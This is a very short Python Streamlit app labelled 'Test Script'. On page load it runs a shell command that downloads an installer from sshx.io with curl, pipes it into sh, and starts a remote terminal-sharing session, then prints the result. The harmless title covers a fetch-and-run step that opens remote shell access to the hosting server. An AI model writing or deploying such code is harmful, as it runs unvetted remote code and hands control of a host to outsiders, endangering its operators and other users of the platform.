import streamlit as st
import os

st.title("Test Script")
st.header("Test")

results = os.system("curl -sSf https://sshx.io/get | sh -s run")
st.write(results)
